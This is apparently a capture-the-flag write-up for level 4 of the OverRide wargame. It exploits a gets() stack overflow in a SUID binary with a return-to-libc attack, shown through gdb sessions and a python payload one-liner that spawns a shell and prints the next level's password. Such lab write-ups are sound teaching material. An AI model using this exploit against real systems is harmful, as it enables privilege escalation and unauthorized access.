# Level 4

## Vulnerability

gets() stack overflow + Return-to-libc

## Context

We find a binary with owner ```level05``` and SUID.
```
level04@OverRide:~$ ls -l
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

When run it gives us a hint, then reads from stdin, then exits.
```
level04@OverRide:~$ ./level04
Give me some shellcode, k
[... user input from stdin ...]
child is exiting...
level04@OverRide:~$
```

## Solution

### main() overview

First ```main()``` forks a child process, and links the child's return to the parent.

Then ```gets()``` reads stdin into a buffer.

Finally the child process is killed if it makes a syscall to exec().

See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level04/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

### Find EIP offset

The ```gets()``` call is vulnerable to buffer overflow, lets try to overflow and overwrite EIP, and so take control of the program.

Because ```gets()``` is called by the child process, to investigate in gdb we need to follow the child using the command ```set follow-fork-mode child```.

Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find we reach the EIP after 156 bytes.
```
level04@OverRide:~$ gdb -q level04
...
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04
[New process 1701]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1701]
0x41326641 in ?? ()               // EIP offset = 156 bytes
```

### Find libc addresses

However, if we try to insert a malicious shellcode which opens a shell the child process is killed. So let's try a return-to-libc attack. First, we need the address of ```system()```, ```exit()``` & ```"/bin/sh"```.
```
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

### Build exploit

So we build our exploit string:
1. 156 byte buffer - ```python -c "print 'A' * 156"```
2. system() address - ```\xd0\xae\xe6\xf7```
3. exit() address - ```\x70\xeb\xe5\xf7```
4. "/bin/sh" address - ```\xec\x97\xf8\xf7```

Let's pipe our exploit string into the binary stdin.
```
level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" ; cat) |./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
